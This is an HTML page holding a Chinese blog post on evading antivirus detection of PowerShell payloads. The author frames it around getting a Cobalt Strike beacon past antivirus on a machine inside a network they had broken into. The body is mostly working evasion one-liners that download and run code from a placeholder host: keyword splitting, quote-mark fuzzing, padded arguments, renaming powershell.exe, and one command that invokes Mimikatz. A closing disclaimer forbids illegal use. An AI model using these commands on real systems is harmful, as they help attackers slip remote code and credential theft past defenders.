@@ -1,0 +1,345 @@
+﻿<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="referrer" content="origin-when-crossorigin" />
+    <meta name="description" content="Powershell免杀 0x01 前言 前几天搞一个站的时候，进入内网，想让内网一台机子powershell上线。然后被杀软拦截了，极其的不讲武德，想着找我极强的朋友们白嫖个免杀的方法。 后面还是没" />
+    <meta property="og:description" content="Powershell免杀 0x01 前言 前几天搞一个站的时候，进入内网，想让内网一台机子powershell上线。然后被杀软拦截了，极其的不讲武德，想着找我极强的朋友们白嫖个免杀的方法。 后面还是没" />
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>Powershell免杀 - Chen-w - 博客园</title>
+    <link id="favicon" rel="shortcut icon" href="//common.cnblogs.com/favicon.svg" type="image/svg+xml" />
+    
+    <link rel="stylesheet" href="/css/blog-common.min.css?v=zS6-e1bxywlu3kpHvpr1J6MySwya3ztFtEnS7RYQ0Fk" />
+    
+    <link type="text/css" rel="stylesheet" href="https://www.cnblogs.com/chen-w/custom.css?v=DSs&#x2B;/HZA61E2xF4Eh7jOLpLi9zU=" />
+    <link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="/skins/SimpleMemory/bundle-SimpleMemory-mobile.min.css" />
+    
+    <link type="application/rss+xml" rel="alternate" href="https://www.cnblogs.com/chen-w/rss" />
+    <link type="application/rsd+xml" rel="EditURI" href="https://www.cnblogs.com/chen-w/rsd.xml" />
+    <link type="application/wlwmanifest+xml" rel="wlwmanifest" href="https://www.cnblogs.com/chen-w/wlwmanifest.xml" />
+    <script>
+        var currentBlogId = 678016;
+        var currentBlogApp = 'chen-w';
+        var cb_enable_mathjax = false;
+        var isLogined = false;
+        var isBlogOwner = false;
+        var skinName = 'SimpleMemory';
+        var visitorUserId = '';
+    </script>
+        <script>
+            var currentPostDateAdded = '2021-05-02 09:32';
+        </script>
+    <script src="https://common.cnblogs.com/scripts/jquery-2.2.0.min.js"></script>
+    <script src="/js/blog-common.min.js?v=yJQaJ16S00coMfzvh-NgF2zm2J87f5VfNamFdsnKHrc"></script>
+    
+    
+    
+</head>
+<body class="no-navbar">
+    <a name="top"></a>
+        <div id="bannerbar" class="bannerbar-mobile formobile">
+            <a href="https://www.aliyun.com/minisite/goods?userCode=swh7dvlt" target="_blank" onclick="ga('send', 'event', 'Link', 'click', 'aliyun-cps-blog-bannerbar-mobile')">
+                <img src="https://img2020.cnblogs.com/blog/35695/202104/35695-20210428213541700-642740375.jpg" alt="" />
+            </a>
+        </div>
+    <div id="top_nav" class="navbar forpc navbar-custom">
+        <nav id="nav_main" class="navbar-main">
+            <ul id="nav_left" class="navbar-list navbar-left">
+                <li class="navbar-branding"><a href="https://www.cnblogs.com/" title="开发者的网上家园"><img src="/images/logo.svg?v=R9M0WmLAIPVydmdzE2keuvnjl-bPR7_35oHqtiBzGsM" alt="博客园Logo" /></a></li>
+                <li><a href="/" onclick="ga('send', 'event', 'Link', 'click', 'skin-navbar-sitehome')">首页</a></li>
+                <li><a href="https://news.cnblogs.com/" onclick="ga('send', 'event', 'Link', 'click', 'skin-navbar-news')">新闻</a></li>
+                <li><a href="https://q.cnblogs.com/" onclick="ga('send', 'event', 'Link', 'click', 'skin-navbar-q')">博问</a></li>
+                <li><a id="nav_brandzone" href="https://brands.cnblogs.com/" onclick="ga('send', 'event', 'Link', 'click', 'skin-navbar-brands')">专区</a></li>
+                <li><a href="https://ing.cnblogs.com/" onclick="ga('send', 'event', 'Link', 'click', 'skin-navbar-ing')">闪存</a></li>
+                <li><a href="https://edu.cnblogs.com/" onclick="ga('send', 'event', 'Link', 'click', 'skin-navbar-edu')">班级</a></li>
+            </ul>
+            <ul id="nav_right" class="navbar-list navbar-right">
+                <li>
+                    <form id="zzk_search" class="navbar-search" action="https://zzk.cnblogs.com/s" method="get">
+                        <input name="w" id="zzk_search_input" placeholder="代码改变世界" type="text" tabindex="3" />
+                        <button type="submit" id="zzk_search_button">
+                            <img src="/images/aggsite/search.svg" alt="搜索" />
+                        </button>
+                    </form>
+                </li>
+                <li id="navbar_login_status" class="navbar-list">
+                    <a class="navbar-user-info navbar-blog" href="https://i.cnblogs.com/EditPosts.aspx?opt=1" alt="写随笔" title="写随笔">
+                        <img id="new_post_icon" class="navbar-icon" src="/images/aggsite/newpost.svg" alt="写随笔" />
+                    </a>
+                    <a id="navblog-myblog-icon" class="navbar-user-info navbar-blog" href="https://passport.cnblogs.com/GetBlogApplyStatus.aspx" alt="我的博客" title="我的博客">
+                        <img id="myblog_icon" class="navbar-icon" src="/images/aggsite/myblog.svg" alt="我的博客" />
+                    </a>
+                    <a class="navbar-user-info navbar-message navbar-icon-wrapper" href="https://msg.cnblogs.com/" alt="短消息" title="短消息">
+                        <img id="msg_icon" class="navbar-icon" src="/images/aggsite/message.svg?v=J0WS2P2iPgaIVgXxcAhliw4AFZIpaTWxtdoNAv9eiCA" alt="短消息" />
+                        <span id="msg_count" style="display: none"></span>
+                    </a>
+                    <div id="user_info" class="navbar-user-info dropdown">
+                        <a class="dropdown-button" href="https://home.cnblogs.com/">
+                            <img id="user_icon" class="navbar-avatar" src="/images/aggsite/avatar-default.svg" alt="用户头像" />
+                        </a>
+                        <div class="dropdown-menu">
+                            <a id="navblog-myblog-text" href="https://passport.cnblogs.com/GetBlogApplyStatus.aspx">我的博客</a>
+                            <a href="https://home.cnblogs.com/">我的园子</a>
+                            <a href="https://account.cnblogs.com/settings/account">账号设置</a>
+                            <a href="javascript:void(0)" id="navbar_lite_mode_toggle" title="简洁模式会使用简洁款皮肤显示所有博客">
+    简洁模式 <img id="navbar_lite_mode_on" src="/images/lite-mode-check.svg" class="hide" /><span id="navbar_lite_mode_spinner" class="hide">...</span>
+</a>
+                            <a href="javascript:void(0)" onclick="account.logout();">退出登录</a>
+                        </div>
+                    </div>
+                    <a class="navbar-anonymous" href="https://account.cnblogs.com/signup/">注册</a>
+                    <a class="navbar-anonymous" href="javascript:void(0);" onclick="account.login()">登录</a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+
+    
+    <!--done-->
+<div id="home">
+<div id="header">
+	<div id="blogTitle">
+        <a id="lnkBlogLogo" href="https://www.cnblogs.com/chen-w/"><img id="blogLogo" src="/skins/custom/images/logo.gif" alt="返回主页" /></a>		
+		
+<!--done-->
+<h1><a id="Header1_HeaderTitle" class="headermaintitle HeaderMainTitle" href="https://www.cnblogs.com/chen-w/">Chenw</a>
+</h1>
+<h2>一位安服实习僧～</h2>
+
+
+
+
+		
+	</div><!--end: blogTitle 博客的标题和副标题 -->
+	<div id="navigator">
+		
+<ul id="navList">
+<li><a id="blog_nav_sitehome" class="menu" href="https://www.cnblogs.com/">
+博客园</a>
+</li>
+<li>
+<a id="blog_nav_myhome" class="menu" href="https://www.cnblogs.com/chen-w/">
+首页</a>
+</li>
+<li>
+
+<a id="blog_nav_newpost" class="menu" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">
+新随笔</a>
+</li>
+<li>
+</li>
+<li>
+<a id="blog_nav_rss" class="menu" href="javascript:void(0)" data-rss="https://www.cnblogs.com/chen-w/rss/">
+订阅</a>
+<!--<partial name="./Shared/_XmlLink.cshtml" model="Model" /></li>--></li>
+<li>
+<a id="blog_nav_admin" class="menu" href="https://i.cnblogs.com/">
+管理</a>
+</li>
+</ul>
+
+
+		<div class="blogStats">
+			<div id="blog_stats_place_holder"><script>loadBlogStats();</script></div>
+		</div><!--end: blogStats -->
+	</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+	<div id="mainContent">
+	<div class="forFlow">
+		<div id="post_detail">
+    <!--done-->
+    <div id="topics">
+        <div class="post">
+            <h1 class = "postTitle">
+                
+<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/chen-w/p/14726549.html">
+    <span>Powershell免杀</span>
+    
+
+
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+<h1 id="powershell免杀">Powershell免杀</h1>
+<hr>
+<h2 id="0x01-前言">0x01 前言</h2>
+<p>前几天搞一个站的时候，进入内网，想让内网一台机子powershell上线。然后被杀软拦截了，极其的不讲武德，想着找我极强的朋友们白嫖个免杀的方法。<br>
+<img src="https://img2020.cnblogs.com/blog/1764572/202105/1764572-20210502212904294-2087610224.png" alt="" loading="lazy"><br>
+后面还是没有白嫖到，只好自己去研究学习一下了（针对CS的进行免杀，后面思想大同小异）于是做了这个小笔记。<br>
+<img src="https://img2020.cnblogs.com/blog/1764572/202105/1764572-20210502213020509-1130865384.png" alt="" loading="lazy"></p>
+<h2 id="0x02-powershell免杀思路">0x02 Powershell免杀思路</h2>
+<p>先介绍一下powershell木马最常用的方式，一般都为远程下载然后执行的方法，特点就是：直接内存运行，无文件落地。<br>
+例如：</p>
+<pre><code class="language-shell">powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://x.x.x.x/a'))"
+</code></pre>
+<p>通常使用过程中当调用powershell进行远程下载执行时，会被杀软进行拦截。那么针对Powershell的免杀有两个思路：</p>
+<ol>
+<li>对ps1文件进行免杀处理</li>
+<li>对Powershell的行为进行免杀处理</li>
+</ol>
+<h2 id="0x03-免杀方法">0x03 免杀方法</h2>
+<h3 id="1-使用关键字拆分进行bypass">1. 使用关键字拆分进行bypass</h3>
+<hr>
+<p>在实战过程中，一些杀软是会对powershell命令当中的参数、函数进行一个检测，那么此时就可以对关键字进行拆分来进行绕过。<br>
+例如，拆分前的powershell命令为：</p>
+<pre><code class="language-shell">powershell.exe "IEX ((new-object net.webclient).downloadstring('http://x.x.x.x/a'))”
+</code></pre>
+<p>假如杀软是对http这个关键字进行检测，那么我们可以对其进行如下拆分进行绕过，拆分后的powershell命令为：</p>
+<pre><code class="language-shell">powershell "$a='IEX((New-Object Net.WebClient).DownloadString(''ht';$b='tp://x.x.x.x/a''));Invoke-Mimikatz';IEX ($a+$b)”
+</code></pre>
+<p>假如是对downloadstring这个函数进行检测，那么我们可以使用replace来进行替换函数拆分downloadstring进行一个绕过，拆分后的powershell命令如下：</p>
+<pre><code class="language-shell">powershell "$a='IEX(New-Object Net.WebClient).Downlo';$b='123(''http://x.x.x.x'')'.Replace('123','adString');IEX ($a+$b)"
+</code></pre>
+<h3 id="2-fuzz思想进行bypass">2. Fuzz思想进行bypass</h3>
+<hr>
+<p>可以利用Fuzz的思想进行bypass，例如可以使用中文字符里的单引号进行bypass<br>
+例如，利用单引号混淆前的powershell命令为：</p>
+<pre><code class="language-shell">powershell.exe "IEX ((new-object net.webclient).downloadstring('http://x.x.x.x/a’))”
+</code></pre>
+<p>使用单引号混淆后的命令为：</p>
+<pre><code class="language-shell">powershell.exe "IEX ((new-object net.webclient).downloadstring('ht‘+’tp://x.x.x.x/a’))”
+</code></pre>
+<h3 id="3-超长命令bypass">3. 超长命令bypass</h3>
+<hr>
+<p>可以使用超长的命令来进行bypass。<br>
+例如，利用超长命令bypas前的powershell命令为：</p>
+<pre><code class="language-shell">powershell.exe "IEX ((new-object net.webclient).downloadstring('http://x.x.x.x/a’))”
+</code></pre>
+<p>进行超长命令构造后的powershell命令为：</p>
+<pre><code class="language-shell">powershell.exe -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal w Normal -w Normal -w Normal -w Normal -w Normal -w Normal IEX ((new-object net.webclient).downloadstring('http://x.x.x.x/a'))
+</code></pre>
+<h3 id="4-使用copy命令进行bypass">4. 使用copy命令进行bypass</h3>
+<hr>
+<p>这里讲一个骚操作，一些杀软是检测powershell这个使用的动作，那么我们可以使用windows的copy命令，将powshell进行拷贝命名为其他的，例如，使用copy命令将powershell拷贝一个并命名为bypass.txt<br>
+命令：</p>
+<pre><code class="language-shll">copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe bypass.txt
+</code></pre>
+<p>那么后面就可以这样子来执行powershell来进行绕过杀软检测：</p>
+<pre><code class="language-shell">bypass.txt IEX ((new-object net.webclient).downloadstring('http://x.x.x.x/a'))
+</code></pre>
+<h3 id="5-混合bypass">5. 混合bypass</h3>
+<hr>
+<p>就是将前面讲述的几种方法进行混合使用。<br>
+例如：</p>
+<pre><code class="language-shell">powershell.exe -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal set-alias -name key -value IEX; key(New-Object Net.WebClient).DownloadString('ht‘+’tp://x.x.x.x/a')
+</code></pre>
+<h2 id="0x04-结尾">0x04 结尾</h2>
+<p>当然除了上述的几种方式可以进行bypass以外，还有其他的方法，例如可以将 powershell命令打包成exe程序进行绕过，可以使用C、Python、go等，其中查杀率：C &gt; Python &gt; go<br>
+<img src="https://img2020.cnblogs.com/blog/1764572/202105/1764572-20210502213055871-350268236.png" alt="" loading="lazy"><br>
+当然了，年轻人是要讲武德的。<br>
+切勿利用上述方法去干不讲武德的事情，不然到时候啪的一下，很快啊，一不小心就进去了。<br>
+<img src="https://img2020.cnblogs.com/blog/1764572/202105/1764572-20210502213115533-1407013863.png" alt="" loading="lazy"></p>
+<h2 id="0x05-免责声明">0x05 免责声明</h2>
+<blockquote>
+<p>严禁读者利用以上介绍知识点对网站进行非法操作 , 本文仅用于技术交流和学习 , 如果您利用文章中介绍的知识对他人造成损失 , 后果由您自行承担 , 如果您不能同意该约定 , 请您务必不要阅读该文章 , 感谢您的配合 !</p>
+</blockquote>
+
+</div>
+<div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+    <div id="blog_post_info"></div>
+    <div class="clear"></div>
+    <div id="post_next_prev"></div>
+</div>
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date">2021-05-02 21:32</span>&nbsp;
+<a href="https://www.cnblogs.com/chen-w/">Chen-w</a>&nbsp;
+阅读(<span id="post_view_count">21</span>)&nbsp;
+评论(<span id="post_comment_count">0</span>)&nbsp;
+<a href="https://i.cnblogs.com/EditPosts.aspx?postid=14726549" rel="nofollow">编辑</a>&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(14726549);return false;">收藏</a></div>
+        </div>
+	    
+	    
+    </div><!--end: topics 文章、评论容器-->
+</div>
+<script src="https://common.cnblogs.com/highlight/10.3.1/highlight.min.js"></script>
+<script>markdown_highlight();</script>
+<script>
+    var allowComments = true, cb_blogId = 678016, cb_blogApp = 'chen-w', cb_blogUserGuid = '3d49d7d4-cd2a-47e3-e10a-08d7188de755';
+    var cb_entryId = 14726549, cb_entryCreatedDate = '2021-05-02 21:32', cb_postType = 1;
+    updatePostStats(
+        [cb_entryId],
+        function(id, count) { $("#post_view_count").text(count) },
+        function(id, count) { $("#post_comment_count").text(count) })
+    zoomManager.apply("#cnblogs_post_body img:not(.code_img_closed):not(.code_img_opened)");
+</script>
+<a name="!comments"></a>
+<div id="blog-comments-placeholder"></div>
+<div id="comment_form" class="commentform">
+    <a name="commentform"></a>
+    <div id="divCommentShow"></div>
+    <div id="comment_nav"><span id="span_refresh_tips"></span><a href="javascript:void(0);" onclick="return RefreshCommentList();" id="lnk_RefreshComments" runat="server" clientidmode="Static">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+    <div id="comment_form_container"></div>
+    <div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+    <div id="ad_t2"></div>
+    <div id="opt_under_post"></div>
+    <div id="cnblogs_c1" class="under-post-card">
+        <div id='div-gpt-ad-1592365906576-0' style='width: 300px; height: 250px;'></div>
+    </div>
+    <div id="under_post_card1"></div>
+    <div id="cnblogs_c2" class="under-post-card">
+        <div id='div-gpt-ad-1592366332455-0' style='width: 468px; height: 60px;'></div>
+    </div>
+    <div id="under_post_card2"></div>
+    <div id="HistoryToday" class="under-post-card"></div>
+    <script type="text/javascript">
+       var commentManager = new blogCommentManager();
+       commentManager.renderComments(0);
+       fixPostBody();
+       deliverBigBanner();
+setTimeout(function() { incrementViewCount(cb_entryId); }, 50);       deliverT2();
+       deliverC1C2();
+       loadNewsAndKb();
+       loadBlogSignature();
+LoadPostCategoriesTags(cb_blogId, cb_entryId);       LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+       GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
+       loadOptUnderPost();
+       GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);
+    </script>
+</div>
+
+	</div><!--end: forFlow -->
+	</div><!--end: mainContent 主体内容容器-->
+	<div id="sideBar">
+		<div id="sideBarMain">
+			<div id="sidebar_news" class="newsItem">
+            <script>loadBlogNews();</script>
+</div>
+<div id="sidebar_c3"></div>
+			<div id="blog-calendar" style="display:none"></div><script>loadBlogDefaultCalendar();</script>			
+			<div id="leftcontentcontainer">
+				<div id="blog-sidecolumn"></div>
+                    <script>loadBlogSideColumn();</script>
+			</div>			
+		</div><!--end: sideBarMain -->
+	</div><!--end: sideBar 侧边栏容器 -->
+	<div class="clear"></div>
+	</div><!--end: main -->
+	<div class="clear"></div>
+	<div id="footer">
+		<!--done-->
+Copyright &copy; 2021 Chen-w
+<br /><span id="poweredby">Powered by .NET 5.0 on Kubernetes</span>
+
+
+
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+
+
+    
+
+    <input type="hidden" id="antiforgery_token" value="CfDJ8L-rpLgFVEJMgssCVvNUAjtG6XrJnNPMdUnOF0lnTFjGJncsUF2cYCE4PONu_z3O3Il1zQCQ_Hh3C1CcsKEkTpIbSQ5yUs4EAXBQLewj7ZPigevbtW00zt4Z6NnOCmAIUoKiI6_2Uya4eQ_bHSuZQFM" />
+</body>
+</html>
